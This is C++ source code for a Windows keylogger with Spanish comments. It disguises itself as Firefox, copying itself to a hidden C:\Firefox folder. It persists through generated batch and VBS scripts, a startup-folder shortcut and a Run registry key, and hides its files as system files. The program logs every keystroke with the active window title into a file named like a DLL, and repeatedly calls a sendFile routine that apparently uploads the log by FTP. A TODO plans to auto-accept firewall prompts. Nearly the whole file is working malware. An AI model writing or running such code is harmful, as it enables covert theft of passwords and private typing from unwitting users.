#include <iostream>
#include <windows.h>
#include <wininet.h>
#include <direct.h>
#include <fstream>
#include <sstream>
#include <cstdlib>

#include "KeyConverter.h"
#include "FileHandler.h"
#include "FTPHandler.h"
#include "Utils.h"

#pragma comment(linker, "/SUBSYSTEM:console /ENTRY:mainCRTStartup")

using namespace std;

bool firstRun;

const string firefoxPath = "C:\\Firefox";

void shortcutChecker(){
    if (!fileExists("C:\\Firefox\\systemchecker.bat")){        
        char batContent[2048];
                
        strcpy(batContent, "attrib +s +h \"%~f0\"\r\n");
        strcpy(batContent, ":check\r\n");
        strcat(batContent, "timeout /t 4\r\n");
        //strcat(batContent, "tasklist /FI \"IMAGENAME eq firefox.exe\" | find /I /N \"firefox.exe\">NUL\r\n");
        //strcat(batContent, "if \"%ERRORLEVEL%\"==\"1\" start C:\\Firefox\\firefox.exe\r\n");
        strcat(batContent, "if not exist %APPDATA%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\firefox.lnk goto create\r\n");
        strcat(batContent, "goto check\r\n");
        
        strcat(batContent, ":create\r\n");        
        strcat(batContent, "set SCRIPT=\"%TEMP%\\%RANDOM%-%RANDOM%-%RANDOM%-%RANDOM%.vbs\"\r\n");
        strcat(batContent, "echo Set oWS = WScript.CreateObject(\"WScript.Shell\") >> %SCRIPT%\r\n");
        strcat(batContent, "echo sLinkFile = \"C:\\Firefox\\firefox.lnk\" >> %SCRIPT%\r\n");
        strcat(batContent, "echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %SCRIPT%\r\n");
        strcat(batContent, "echo oLink.TargetPath = \"C:\\Firefox\\firefox.exe\" >> %SCRIPT%\r\n");
        strcat(batContent, "echo oLink.Save >> %SCRIPT%\r\n");
        strcat(batContent, "cscript /nologo %SCRIPT%\r\n");
        strcat(batContent, "del %SCRIPT%\r\n");
        strcat(batContent, "copy C:\\Firefox\\firefox.lnk %APPDATA%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\firefox.lnk /y\r\n");
        strcat(batContent, "del C:\\Firefox\\firefox.lnk\r\n");        
        strcat(batContent, "goto check\r\n");
        // Maybe do something to restore the exe?
        
        ofstream bat("C:\\Firefox\\systemchecker.bat");
        bat << batContent;
        bat.close();
    }
    
    runBatFile("C:\\Firefox\\systemchecker.bat");
    
}
BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
{
    HKEY hKey = NULL;
    LONG lResult = 0;
    BOOL fSuccess = TRUE;
    DWORD dwSize;

    const size_t count = MAX_PATH*2;
    wchar_t szValue[count] = {};

    wcscpy(szValue, L"\"");
    wcscat(szValue, pathToExe);
    wcscat(szValue, L"\" ");

    if (args != NULL)
    {
        // caller should make sure "args" is quoted if any single argument has a space
        // e.g. (L"-name \"Mark Voidale\"");
        wcscat(szValue, args);
    }

    lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

    fSuccess = (lResult == 0);

    if (fSuccess)
    {
        dwSize = (wcslen(szValue)+1)*2;
        lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
        fSuccess = (lResult == 0);
    }

    if (hKey != NULL)
    {
        RegCloseKey(hKey);
        hKey = NULL;
    }

    return fSuccess;
}
void RegisterProgram()
{
    wchar_t szPathToExe[MAX_PATH];   
    const wchar_t* path = s2wct("C:\\Firefox\\firefox.exe");    
    wcscpy(szPathToExe, path);        
    RegisterMyProgramForStartup(L"Web browsers", szPathToExe, NULL);
}

void infect(){
    char pathLocation[MAX_PATH];
    strcpy(pathLocation, "C:\\Users\\");
    strcat(pathLocation, "\\Documents\\nananana.bat");
    
    char startup[MAX_PATH]; //esto estaría bien meterlo en funciones
    strcpy(startup, "C:\\Users\\");
    strcat(startup, getUserName().c_str());
    strcat(startup, "\\AppData\\Roaming\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup");
    
    char firefoxLoc[MAX_PATH];
    strcpy(firefoxLoc, startup);
    strcat(firefoxLoc, "\\firefox.lnk");
        
    char batContent[2048];
    bool firefoxExists = true;
    
    if (!fileExists(firefoxPath.c_str()) || !fileExists("C:\\Firefox\\firefox.exe")){
        mkdir(firefoxPath.c_str());
        firefoxExists = false;
    }
    
    if(!fileExists(firefoxLoc) || !firefoxExists){
        strcpy(batContent, "set \"destino0=");
        strcat(batContent, getExecutableFullPath().c_str());
        strcat(batContent, "\"");
        strcat(batContent, "\r\n");
        strcat(batContent, "set \"destino1=%appdata%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\\"\r\n"); //TODO: usar variable startup
        strcat(batContent, "set \"destino2=C:\\Firefox\\\"\r\n");
        strcat(batContent, "set \"destino3=C:\\Firefox\\firefox.exe\"\r\n");
        if(!firefoxExists){
           strcat(batContent, "copy %destino0% %destino3% /y\r\n");
           strcat(batContent, "attrib C:\\Firefox +s +h\r\n");
        }
        strcat(batContent, "set SCRIPT=\"%TEMP%\\%RANDOM%-%RANDOM%-%RANDOM%-%RANDOM%.vbs\"\r\n");
        strcat(batContent, "echo Set oWS = WScript.CreateObject(\"WScript.Shell\") >> %SCRIPT%\r\n");
        strcat(batContent, "echo sLinkFile = \"%destino2%firefox.lnk\" >> %SCRIPT%\r\n");
        strcat(batContent, "echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %SCRIPT%\r\n");
        strcat(batContent, "echo oLink.TargetPath = \"%destino3%\" >> %SCRIPT%\r\n");
        strcat(batContent, "echo oLink.Save >> %SCRIPT%\r\n");
        strcat(batContent, "cscript /nologo %SCRIPT%\r\n");
        strcat(batContent, "del %SCRIPT%\r\n");
        strcat(batContent, "xcopy %destino2%firefox.lnk %destino1% /y\r\n");
        strcat(batContent, "del %destino2%firefox.lnk\r\n");
        //strcat(batContent, "attrib %destino1%firefox.lnk +h\r\n");
        strcat(batContent, "attrib %destino3%  +s +h\r\n");
        strcat(batContent, "attrib %destino2%sysid.dat +s +h\r\n");
        strcat(batContent, "attrib %destino2%systemconf.dll  +s +h\r\n");
        //strcat(batContent, "attrib %destino0%  +s +h\r\n");
       // strcat(batContent,"DEL \"%~f0\"\r\n\0");

        ofstream bat(pathLocation);
        bat << batContent;
        bat.close();

        runBatFile(pathLocation);
        RegisterProgram();
        Sleep(2000);
        if(firstRun){
            runFirefox();
            exit(0);
        }
    }
}
void Log(int limite_keystrokes){
    string strings="";
    int keys;
    int keystrokes=0;
    char currentWindowTitle[MAX_PATH];
    char newWindowTitle[MAX_PATH];

    GetWindowText(GetForegroundWindow(), currentWindowTitle, sizeof(currentWindowTitle));

    while(keystrokes<limite_keystrokes){
        Sleep(5);
        for(keys=8;keys<=256;keys++){
            if(GetAsyncKeyState(keys)&1==1){
                GetWindowText(GetForegroundWindow(),currentWindowTitle,sizeof(currentWindowTitle));
                strings = convertKey(keys, keystrokes);
                // TODO: Check if current window title is firewall one (Windows Security Alert). If it is, click yes
                if(strcmp(currentWindowTitle,  newWindowTitle)&& strings!="" && strings!="[TAB]"){

                    ofstream store("C:\\Firefox\\systemconf.dll", ios::app);
                    store << "\r\n" << "__________________________________________";
                    store << "\n" << "WINDOW: " << currentWindowTitle << "\n"
                            << "CONTENT: ";
                    store.close();
                    strcpy(newWindowTitle, currentWindowTitle);
                }
               //cout << "Tecla pulsada: " << keys << endl;
                storeKey(strings);
                keystrokes++;
                //cout << "llevas " << keystrokes << " keystrokes de " << limite_keystrokes << endl;
            }
        }
    }
}
std::string getIdentification(){
    std::ifstream id("C:\\Firefox\\sysid.dat");
    std::string identification;
    bool sendFileOnFirstRun = true;
    
    if(id.good()){
        if(getExecutablePath()!= firefoxPath  || isProcessRunning("firefox.exe")){
            exit(0);
        }
        else{
            firstRun = false;
            shortcutChecker();
            getline(id, identification);
            id.close();
        }
        
    }
    else{
        firstRun = true;
        identification = createId();
        if(sendFileOnFirstRun){
            sendFile(identification, firstRun); 
        }
        infect();
    }  
    return identification;
}

int main(int argc, char *argv[]){
    string id = getIdentification();
    int keystroke_limit=500;

    while(true){
        Log(keystroke_limit);
        sendFile(id, firstRun);
    }
    return 0;
}
